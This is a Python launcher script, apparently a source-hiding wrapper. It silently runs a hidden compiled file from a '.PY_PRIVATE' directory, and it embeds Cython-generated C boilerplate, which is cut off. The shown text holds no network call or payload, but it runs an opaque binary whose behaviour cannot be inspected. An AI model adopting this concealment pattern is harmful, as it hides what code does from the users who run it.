
import os
import sys

PSH_TEAM_KEY = "بخ 👀"

EXECUTE_FILE = ".PY_PRIVATE/20250529181120509"
PREFIX = sys.prefix
EXPORT_PYTHONHOME = 'export PYTHONHOME='+PREFIX
EXPORT_PYTHON_EXECUTABLE = 'export PYTHON_EXECUTABLE='+sys.executable

RUN = "./"+EXECUTE_FILE

if os.path.isfile(EXECUTE_FILE):
    os.system(EXPORT_PYTHONHOME+" && "+EXPORT_PYTHON_EXECUTABLE+" && "+RUN)
    exit(0)

C_SOURCE = r'''#ifndef PY_SSIZE_T_CLEAN
#define PY_SSIZE_T_CLEAN
#endif /* PY_SSIZE_T_CLEAN */
#include "Python.h"
#ifndef Py_PYTHON_H
    #error Python headers needed to compile C extensions, please install development version of Python.
#elif PY_VERSION_HEX < 0x02060000 || (0x03000000 <= PY_VERSION_HEX && PY_VERSION_HEX < 0x03030000)
    #error Cython requires Python 2.6+ or Python 3.3+.
#else
#define CYTHON_ABI "0_29_33"
#define CYTHON_HEX_VERSION 0x001D21F0
#define CYTHON_FUTURE_DIVISION 1
#include <stddef.h>
#ifndef offsetof
  #define offsetof(type, member) ( (size_t) & ((type*)0) -> member )
#endif
#if !defined(WIN32) && !defined(MS_WINDOWS)
  #ifndef __stdcall
    #define __stdcall
  #endif
  #ifndef __cdecl
    #define __cdecl
  #endif
  #ifndef __fastcall
    #define __fastcall
  #endif
#endif
#ifndef DL_IMPORT
  #define DL_IMPORT(t) t
#endif
#ifndef DL_EXPORT
  #define DL_EXPORT(t) t
#endif
#define __PYX_COMMA ,
#ifndef HAVE_LONG_LONG
  #if PY_VERSION_HEX >= 0x02070000
    #define HAVE_LONG_LONG
  #endif
#endif
#ifndef PY_LONG_LONG
  #define PY_LONG_LONG LONG_LONG
#endif
#ifndef Py_HUGE_VAL
  #define Py_HUGE_VAL HUGE_VAL
#endif
#ifdef PYPY_VERSION
  #define CYTHON_COMPILING_IN_PYPY 1
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #undef CYTHON_USE_TYPE_SLOTS
  #define CYTHON_USE_TYPE_SLOTS 0
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #if PY_VERSION_HEX < 0x03050000
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #undef CYTHON_USE_UNICODE_INTERNALS
  #define CYTHON_USE_UNICODE_INTERNALS 0
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #undef CYTHON_AVOID_BORROWED_REFS
  #define CYTHON_AVOID_BORROWED_REFS 1
  #undef CYTHON_ASSUME_SAFE_MACROS
  #define CYTHON_ASSUME_SAFE_MACROS 0
  #undef CYTHON_UNPACK_METHODS
  #define CYTHON_UNPACK_METHODS 0
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PYSTON_VERSION)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 1
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #undef CYTHON_USE_ASYNC_SLOTS
  #define CYTHON_USE_ASYNC_SLOTS 0
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #undef CYTHON_PEP489_MULTI_PHASE_INIT
  #define CYTHON_PEP489_MULTI_PHASE_INIT 0
  #undef CYTHON_USE_TP_FINALIZE
  #define CYTHON_USE_TP_FINALIZE 0
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 0
  #endif
#elif defined(PY_NOGIL)
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 0
  #define CYTHON_COMPILING_IN_NOGIL 1
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #undef CYTHON_USE_PYTYPE_LOOKUP
  #define CYTHON_USE_PYTYPE_LOOKUP 0
  #ifndef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #undef CYTHON_USE_PYLIST_INTERNALS
  #define CYTHON_USE_PYLIST_INTERNALS 0
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #undef CYTHON_USE_UNICODE_WRITER
  #define CYTHON_USE_UNICODE_WRITER 0
  #undef CYTHON_USE_PYLONG_INTERNALS
  #define CYTHON_USE_PYLONG_INTERNALS 0
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #undef CYTHON_FAST_THREAD_STATE
  #define CYTHON_FAST_THREAD_STATE 0
  #undef CYTHON_FAST_PYCALL
  #define CYTHON_FAST_PYCALL 0
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT 1
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE 1
  #endif
  #undef CYTHON_USE_DICT_VERSIONS
  #define CYTHON_USE_DICT_VERSIONS 0
  #undef CYTHON_USE_EXC_INFO_STACK
  #define CYTHON_USE_EXC_INFO_STACK 0
#else
  #define CYTHON_COMPILING_IN_PYPY 0
  #define CYTHON_COMPILING_IN_PYSTON 0
  #define CYTHON_COMPILING_IN_CPYTHON 1
  #define CYTHON_COMPILING_IN_NOGIL 0
  #ifndef CYTHON_USE_TYPE_SLOTS
    #define CYTHON_USE_TYPE_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYTYPE_LOOKUP
    #define CYTHON_USE_PYTYPE_LOOKUP 0
  #elif !defined(CYTHON_USE_PYTYPE_LOOKUP)
    #define CYTHON_USE_PYTYPE_LOOKUP 1
  #endif
  #if PY_MAJOR_VERSION < 3
    #undef CYTHON_USE_ASYNC_SLOTS
    #define CYTHON_USE_ASYNC_SLOTS 0
  #elif !defined(CYTHON_USE_ASYNC_SLOTS)
    #define CYTHON_USE_ASYNC_SLOTS 1
  #endif
  #if PY_VERSION_HEX < 0x02070000
    #undef CYTHON_USE_PYLONG_INTERNALS
    #define CYTHON_USE_PYLONG_INTERNALS 0
  #elif !defined(CYTHON_USE_PYLONG_INTERNALS)
    #define CYTHON_USE_PYLONG_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_PYLIST_INTERNALS
    #define CYTHON_USE_PYLIST_INTERNALS 1
  #endif
  #ifndef CYTHON_USE_UNICODE_INTERNALS
    #define CYTHON_USE_UNICODE_INTERNALS 1
  #endif
  #if PY_VERSION_HEX < 0x030300F0 || PY_VERSION_HEX >= 0x030B00A2
    #undef CYTHON_USE_UNICODE_WRITER
    #define CYTHON_USE_UNICODE_WRITER 0
  #elif !defined(CYTHON_USE_UNICODE_WRITER)
    #define CYTHON_USE_UNICODE_WRITER 1
  #endif
  #ifndef CYTHON_AVOID_BORROWED_REFS
    #define CYTHON_AVOID_BORROWED_REFS 0
  #endif
  #ifndef CYTHON_ASSUME_SAFE_MACROS
    #define CYTHON_ASSUME_SAFE_MACROS 1
  #endif
  #ifndef CYTHON_UNPACK_METHODS
    #define CYTHON_UNPACK_METHODS 1
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_FAST_THREAD_STATE
    #define CYTHON_FAST_THREAD_STATE 0
  #elif !defined(CYTHON_FAST_THREAD_STATE)
    #define CYTHON_FAST_THREAD_STATE 1
  #endif
  #ifndef CYTHON_FAST_PYCALL
    #define CYTHON_FAST_PYCALL (PY_VERSION_HEX < 0x030A0000)
  #endif
  #ifndef CYTHON_PEP489_MULTI_PHASE_INIT
    #define CYTHON_PEP489_MULTI_PHASE_INIT (PY_VERSION_HEX >= 0x03050000)
  #endif
  #ifndef CYTHON_USE_TP_FINALIZE
    #define CYTHON_USE_TP_FINALIZE (PY_VERSION_HEX >= 0x030400a1)
  #endif
  #ifndef CYTHON_USE_DICT_VERSIONS
    #define CYTHON_USE_DICT_VERSIONS (PY_VERSION_HEX >= 0x030600B1)
  #endif
  #if PY_VERSION_HEX >= 0x030B00A4
    #undef CYTHON_USE_EXC_INFO_STACK
    #define CYTHON_USE_EXC_INFO_STACK 0
  #elif !defined(CYTHON_USE_EXC_INFO_STACK)
    #define CYTHON_USE_EXC_INFO_STACK (PY_VERSION_HEX >= 0x030700A3)
  #endif
  #ifndef CYTHON_UPDATE_DESCRIPTOR_DOC
    #define CYTHON_UPDATE_DESCRIPTOR_DOC 1
  #endif
#endif
#if !defined(CYTHON_FAST_PYCCALL)
#define CYTHON_FAST_PYCCALL  (CYTHON_FAST_PYCALL && PY_VERSION_HEX >= 0x030600B1)
#endif
#if CYTHON_USE_PYLONG_INTERNALS
  #if PY_MAJOR_VERSION < 3
    #include "longintrepr.h"
  #endif
  #undef SHIFT
  #undef BASE
  #undef MASK
  #ifdef SIZEOF_VOID_P
    enum { __pyx_check_sizeof_voidp = 1 / (int)(SIZEOF_VOID_P == sizeof(void*)) };
  #endif
#endif
#ifndef __has_attribute
  #define __has_attribute(x) 0
#endif
#ifndef __has_cpp_attribute
  #define __has_cpp_attribute(x) 0
#endif
#ifndef CYTHON_RESTRICT
  #if defined(__GNUC__)
    #define CYTHON_RESTRICT __restrict__
  #elif defined(_MSC_VER) && _MSC_VER >= 1400
    #define CYTHON_RESTRICT __restrict
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_RESTRICT restrict
  #else
    #define CYTHON_RESTRICT
  #endif
#endif
#ifndef CYTHON_UNUSED
# if defined(__GNUC__)
#   if !(defined(__cplusplus)) || (__GNUC__ > 3 || (__GNUC__ == 3 && __GNUC_MINOR__ >= 4))
#     define CYTHON_UNUSED __attribute__ ((__unused__))
#   else
#     define CYTHON_UNUSED
#   endif
# elif defined(__ICC) || (defined(__INTEL_COMPILER) && !defined(_MSC_VER))
#   define CYTHON_UNUSED __attribute__ ((__unused__))
# else
#   define CYTHON_UNUSED
# endif
#endif
#ifndef CYTHON_MAYBE_UNUSED_VAR
#  if defined(__cplusplus)
     template<class T> void CYTHON_MAYBE_UNUSED_VAR( const T& ) { }
#  else
#    define CYTHON_MAYBE_UNUSED_VAR(x) (void)(x)
#  endif
#endif
#ifndef CYTHON_NCP_UNUSED
# if CYTHON_COMPILING_IN_CPYTHON
#  define CYTHON_NCP_UNUSED
# else
#  define CYTHON_NCP_UNUSED CYTHON_UNUSED
# endif
#endif
#define __Pyx_void_to_None(void_result) ((void)(void_result), Py_INCREF(Py_None), Py_None)
#ifdef _MSC_VER
    #ifndef _MSC_STDINT_H_
        #if _MSC_VER < 1300
           typedef unsigned char     uint8_t;
           typedef unsigned int      uint32_t;
        #else
           typedef unsigned __int8   uint8_t;
           typedef unsigned __int32  uint32_t;
        #endif
    #endif
#else
   #include <stdint.h>
#endif
#ifndef CYTHON_FALLTHROUGH
  #if defined(__cplusplus) && __cplusplus >= 201103L
    #if __has_cpp_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH [[fallthrough]]
    #elif __has_cpp_attribute(clang::fallthrough)
      #define CYTHON_FALLTHROUGH [[clang::fallthrough]]
    #elif __has_cpp_attribute(gnu::fallthrough)
      #define CYTHON_FALLTHROUGH [[gnu::fallthrough]]
    #endif
  #endif
  #ifndef CYTHON_FALLTHROUGH
    #if __has_attribute(fallthrough)
      #define CYTHON_FALLTHROUGH __attribute__((fallthrough))
    #else
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
  #if defined(__clang__ ) && defined(__apple_build_version__)
    #if __apple_build_version__ < 7000000
      #undef  CYTHON_FALLTHROUGH
      #define CYTHON_FALLTHROUGH
    #endif
  #endif
#endif

#ifndef CYTHON_INLINE
  #if defined(__clang__)
    #define CYTHON_INLINE __inline__ __attribute__ ((__unused__))
  #elif defined(__GNUC__)
    #define CYTHON_INLINE __inline__
  #elif defined(_MSC_VER)
    #define CYTHON_INLINE __inline
  #elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define CYTHON_INLINE inline
  #else
    #define CYTHON_INLINE
  #endif
#endif

#if CYTHON_COMPILING_IN_PYPY && PY_VERSION_HEX < 0x02070600 && !defined(Py_OptimizeFlag)
  #define Py_OptimizeFlag 0
#endif
#define __PYX_BUILD_PY_SSIZE_T "n"
#define CYTHON_FORMAT_SSIZE_T "z"
#if PY_MAJOR_VERSION < 3
  #define __Pyx_BUILTIN_MODULE_NAME "__builtin__"
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a+k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
  #define __Pyx_DefaultClassType PyClass_Type
#else
  #define __Pyx_BUILTIN_MODULE_NAME "builtins"
  #define __Pyx_DefaultClassType PyType_Type
#if PY_VERSION_HEX >= 0x030B00A1
    static CYTHON_INLINE PyCodeObject* __Pyx_PyCode_New(int a, int k, int l, int s, int f,
                                                    PyObject *code, PyObject *c, PyObject* n, PyObject *v,
                                                    PyObject *fv, PyObject *cell, PyObject* fn,
                                                    PyObject *name, int fline, PyObject *lnos) {
        PyObject *kwds=NULL, *argcount=NULL, *posonlyargcount=NULL, *kwonlyargcount=NULL;
        PyObject *nlocals=NULL, *stacksize=NULL, *flags=NULL, *replace=NULL, *call_result=NULL, *empty=NULL;
        const char *fn_cstr=NULL;
        const char *name_cstr=NULL;
        PyCodeObject* co=NULL;
        PyObject *type, *value, *traceback;
        PyErr_Fetch(&type, &value, &traceback);
        if (!(kwds=PyDict_New())) goto end;
        if (!(argcount=PyLong_FromLong(a))) goto end;
        if (PyDict_SetItemString(kwds, "co_argcount", argcount) != 0) goto end;
        if (!(posonlyargcount=PyLong_FromLong(0))) goto end;
        if (PyDict_SetItemString(kwds, "co_posonlyargcount", posonlyargcount) != 0) goto end;
        if (!(kwonlyargcount=PyLong_FromLong(k))) goto end;
        if (PyDict_SetItemString(kwds, "co_kwonlyargcount", kwonlyargcount) != 0) goto end;
        if (!(nlocals=PyLong_FromLong(l))) goto end;
        if (PyDict_SetItemString(kwds, "co_nlocals", nlocals) != 0) goto end;
        if (!(stacksize=PyLong_FromLong(s))) goto end;
        if (PyDict_SetItemString(kwds, "co_stacksize", stacksize) != 0) goto end;
        if (!(flags=PyLong_FromLong(f))) goto end;
        if (PyDict_SetItemString(kwds, "co_flags", flags) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_code", code) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_consts", c) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_names", n) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_varnames", v) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_freevars", fv) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_cellvars", cell) != 0) goto end;
        if (PyDict_SetItemString(kwds, "co_linetable", lnos) != 0) goto end;
        if (!(fn_cstr=PyUnicode_AsUTF8AndSize(fn, NULL))) goto end;
        if (!(name_cstr=PyUnicode_AsUTF8AndSize(name, NULL))) goto end;
        if (!(co = PyCode_NewEmpty(fn_cstr, name_cstr, fline))) goto end;
        if (!(replace = PyObject_GetAttrString((PyObject*)co, "replace"))) goto cleanup_code_too;
        if (!(empty = PyTuple_New(0))) goto cleanup_code_too; // unfortunately __pyx_empty_tuple isn't available here
        if (!(call_result = PyObject_Call(replace, empty, kwds))) goto cleanup_code_too;
        Py_XDECREF((PyObject*)co);
        co = (PyCodeObject*)call_result;
        call_result = NULL;
        if (0) {
            cleanup_code_too:
            Py_XDECREF((PyObject*)co);
            co = NULL;
        }
        end:
        Py_XDECREF(kwds);
        Py_XDECREF(argcount);
        Py_XDECREF(posonlyargcount);
        Py_XDECREF(kwonlyargcount);
        Py_XDECREF(nlocals);
        Py_XDECREF(stacksize);
        Py_XDECREF(replace);
        Py_XDECREF(call_result);
        Py_XDECREF(empty);
        if (type) {
            PyErr_Restore(type, value, traceback);
        }
        return co;
    }
#else
  #define __Pyx_PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)\
          PyCode_New(a, k, l, s, f, code, c, n, v, fv, cell, fn, name, fline, lnos)
#endif
  #define __Pyx_DefaultClassType PyType_Type
#endif
#ifndef Py_TPFLAGS_CHECKTYPES
  #define Py_TPFLAGS_CHECKTYPES 0
#endif
#ifndef Py_TPFLAGS_HAVE_INDEX
  #define Py_TPFLAGS_HAVE_INDEX 0
#endif
#ifndef Py_TPFLAGS_HAVE_NEWBUFFER
  #define Py_TPFLAGS_HAVE_NEWBUFFER 0
#endif
#ifndef Py_TPFLAGS_HAVE_FINALIZE
  #define Py_TPFLAGS_HAVE_FINALIZE 0
#endif
#ifndef METH_STACKLESS
  #define METH_STACKLESS 0
#endif
#if PY_VERSION_HEX <= 0x030700A3 || !defined(METH_FASTCALL)
  #ifndef METH_FASTCALL
     #define METH_FASTCALL 0x80
  #endif
  typedef PyObject *(*__Pyx_PyCFunctionFast) (PyObject *self, PyObject *const *args, Py_ssize_t nargs);
  typedef PyObject *(*__Pyx_PyCFunctionFastWithKeywords) (PyObject *self, PyObject *const *args,
                                                          Py_ssize_t nargs, PyObject *kwnames);
#else
  #define __Pyx_PyCFunctionFast _PyCFunctionFast
  #define __Pyx_PyCFunctionFastWithKeywords _PyCFunctionFastWithKeywords
#endif
#if CYTHON_FAST_PYCCALL
#define __Pyx_PyFastCFunction_Check(func)\
    ((PyCFunction_Check(func) && (METH_FASTCALL == (PyCFunction_GET_FLAGS(func) & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)))))
#else
#define __Pyx_PyFastCFunction_Check(func) 0
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Malloc)
  #define PyObject_Malloc(s)   PyMem_Malloc(s)
  #define PyObject_Free(p)     PyMem_Free(p)
  #define PyObject_Realloc(p)  PyMem_Realloc(p)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX < 0x030400A1
  #define PyMem_RawMalloc(n)           PyMem_Malloc(n)
  #define PyMem_RawRealloc(p, n)       PyMem_Realloc(p, n)
  #define PyMem_RawFree(p)             PyMem_Free(p)
#endif
#if CYTHON_COMPILING_IN_PYSTON
  #define __Pyx_PyCode_HasFreeVars(co)  PyCode_HasFreeVars(co)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno) PyFrame_SetLineNumber(frame, lineno)
#else
  #define __Pyx_PyCode_HasFreeVars(co)  (PyCode_GetNumFree(co) > 0)
  #define __Pyx_PyFrame_SetLineNumber(frame, lineno)  (frame)->f_lineno = (lineno)
#endif
#if !CYTHON_FAST_THREAD_STATE || PY_VERSION_HEX < 0x02070000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#elif PY_VERSION_HEX >= 0x03060000
  #define __Pyx_PyThreadState_Current _PyThreadState_UncheckedGet()
#elif PY_VERSION_HEX >= 0x03000000
  #define __Pyx_PyThreadState_Current PyThreadState_GET()
#else
  #define __Pyx_PyThreadState_Current _PyThreadState_Current
#endif
#if PY_VERSION_HEX < 0x030700A2 && !defined(PyThread_tss_create) && !defined(Py_tss_NEEDS_INIT)
#include "pythread.h"
#define Py_tss_NEEDS_INIT 0
typedef int Py_tss_t;
static CYTHON_INLINE int PyThread_tss_create(Py_tss_t *key) {
  *key = PyThread_create_key();
  return 0;
}
static CYTHON_INLINE Py_tss_t * PyThread_tss_alloc(void) {
  Py_tss_t *key = (Py_tss_t *)PyObject_Malloc(sizeof(Py_tss_t));
  *key = Py_tss_NEEDS_INIT;
  return key;
}
static CYTHON_INLINE void PyThread_tss_free(Py_tss_t *key) {
  PyObject_Free(key);
}
static CYTHON_INLINE int PyThread_tss_is_created(Py_tss_t *key) {
  return *key != Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE void PyThread_tss_delete(Py_tss_t *key) {
  PyThread_delete_key(*key);
  *key = Py_tss_NEEDS_INIT;
}
static CYTHON_INLINE int PyThread_tss_set(Py_tss_t *key, void *value) {
  return PyThread_set_key_value(*key, value);
}
static CYTHON_INLINE void * PyThread_tss_get(Py_tss_t *key) {
  return PyThread_get_key_value(*key);
}
#endif
#if CYTHON_COMPILING_IN_CPYTHON || defined(_PyDict_NewPresized)
#define __Pyx_PyDict_NewPresized(n)  ((n <= 8) ? PyDict_New() : _PyDict_NewPresized(n))
#else
#define __Pyx_PyDict_NewPresized(n)  PyDict_New()
#endif
#if PY_MAJOR_VERSION >= 3 || CYTHON_FUTURE_DIVISION
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_TrueDivide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceTrueDivide(x,y)
#else
  #define __Pyx_PyNumber_Divide(x,y)         PyNumber_Divide(x,y)
  #define __Pyx_PyNumber_InPlaceDivide(x,y)  PyNumber_InPlaceDivide(x,y)
#endif
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1 && CYTHON_USE_UNICODE_INTERNALS
#define __Pyx_PyDict_GetItemStr(dict, name)  _PyDict_GetItem_KnownHash(dict, name, ((PyASCIIObject *) name)->hash)
#else
#define __Pyx_PyDict_GetItemStr(dict, name)  PyDict_GetItem(dict, name)
#endif
#if PY_VERSION_HEX > 0x03030000 && defined(PyUnicode_KIND)
  #define CYTHON_PEP393_ENABLED 1
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_READY(op)       (0)
  #else
    #define __Pyx_PyUnicode_READY(op)       (likely(PyUnicode_IS_READY(op)) ?\
                                                0 : _PyUnicode_Ready((PyObject *)(op)))
  #endif
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_LENGTH(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) PyUnicode_READ_CHAR(u, i)
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   PyUnicode_MAX_CHAR_VALUE(u)
  #define __Pyx_PyUnicode_KIND(u)         PyUnicode_KIND(u)
  #define __Pyx_PyUnicode_DATA(u)         PyUnicode_DATA(u)
  #define __Pyx_PyUnicode_READ(k, d, i)   PyUnicode_READ(k, d, i)
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  PyUnicode_WRITE(k, d, i, ch)
  #if PY_VERSION_HEX >= 0x030C0000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_LENGTH(u))
  #else
    #if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x03090000
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : ((PyCompactUnicodeObject *)(u))->wstr_length))
    #else
    #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != (likely(PyUnicode_IS_READY(u)) ? PyUnicode_GET_LENGTH(u) : PyUnicode_GET_SIZE(u)))
    #endif
  #endif
#else
  #define CYTHON_PEP393_ENABLED 0
  #define PyUnicode_1BYTE_KIND  1
  #define PyUnicode_2BYTE_KIND  2
  #define PyUnicode_4BYTE_KIND  4
  #define __Pyx_PyUnicode_READY(op)       (0)
  #define __Pyx_PyUnicode_GET_LENGTH(u)   PyUnicode_GET_SIZE(u)
  #define __Pyx_PyUnicode_READ_CHAR(u, i) ((Py_UCS4)(PyUnicode_AS_UNICODE(u)[i]))
  #define __Pyx_PyUnicode_MAX_CHAR_VALUE(u)   ((sizeof(Py_UNICODE) == 2) ? 65535 : 1114111)
  #define __Pyx_PyUnicode_KIND(u)         (sizeof(Py_UNICODE))
  #define __Pyx_PyUnicode_DATA(u)         ((void*)PyUnicode_AS_UNICODE(u))
  #define __Pyx_PyUnicode_READ(k, d, i)   ((void)(k), (Py_UCS4)(((Py_UNICODE*)d)[i]))
  #define __Pyx_PyUnicode_WRITE(k, d, i, ch)  (((void)(k)), ((Py_UNICODE*)d)[i] = ch)
  #define __Pyx_PyUnicode_IS_TRUE(u)      (0 != PyUnicode_GET_SIZE(u))
#endif
#if CYTHON_COMPILING_IN_PYPY
  #define __Pyx_PyUnicode_Concat(a, b)      PyNumber_Add(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  PyNumber_Add(a, b)
#else
  #define __Pyx_PyUnicode_Concat(a, b)      PyUnicode_Concat(a, b)
  #define __Pyx_PyUnicode_ConcatSafe(a, b)  ((unlikely((a) == Py_None) || unlikely((b) == Py_None)) ?\
      PyNumber_Add(a, b) : __Pyx_PyUnicode_Concat(a, b))
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyUnicode_Contains)
  #define PyUnicode_Contains(u, s)  PySequence_Contains(u, s)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyByteArray_Check)
  #define PyByteArray_Check(obj)  PyObject_TypeCheck(obj, &PyByteArray_Type)
#endif
#if CYTHON_COMPILING_IN_PYPY && !defined(PyObject_Format)
  #define PyObject_Format(obj, fmt)  PyObject_CallMethod(obj, "__format__", "O", fmt)
#endif
#define __Pyx_PyString_FormatSafe(a, b)   ((unlikely((a) == Py_None || (PyString_Check(b) && !PyString_CheckExact(b)))) ? PyNumber_Remainder(a, b) : __Pyx_PyString_Format(a, b))
#define __Pyx_PyUnicode_FormatSafe(a, b)  ((unlikely((a) == Py_None || (PyUnicode_Check(b) && !PyUnicode_CheckExact(b)))) ? PyNumber_Remainder(a, b) : PyUnicode_Format(a, b))
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyString_Format(a, b)  PyUnicode_Format(a, b)
#else
  #define __Pyx_PyString_Format(a, b)  PyString_Format(a, b)
#endif
#if PY_MAJOR_VERSION < 3 && !defined(PyObject_ASCII)
  #define PyObject_ASCII(o)            PyObject_Repr(o)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBaseString_Type            PyUnicode_Type
  #define PyStringObject               PyUnicodeObject
  #define PyString_Type                PyUnicode_Type
  #define PyString_Check               PyUnicode_Check
  #define PyString_CheckExact          PyUnicode_CheckExact
#ifndef PyObject_Unicode
  #define PyObject_Unicode             PyObject_Str
#endif
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyBaseString_Check(obj) PyUnicode_Check(obj)
  #define __Pyx_PyBaseString_CheckExact(obj) PyUnicode_CheckExact(obj)
#else
  #define __Pyx_PyBaseString_Check(obj) (PyString_Check(obj) || PyUnicode_Check(obj))
  #define __Pyx_PyBaseString_CheckExact(obj) (PyString_CheckExact(obj) || PyUnicode_CheckExact(obj))
#endif
#ifndef PySet_CheckExact
  #define PySet_CheckExact(obj)        (Py_TYPE(obj) == &PySet_Type)
#endif
#if PY_VERSION_HEX >= 0x030900A4
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_SET_REFCNT(obj, refcnt)
  #define __Pyx_SET_SIZE(obj, size) Py_SET_SIZE(obj, size)
#else
  #define __Pyx_SET_REFCNT(obj, refcnt) Py_REFCNT(obj) = (refcnt)
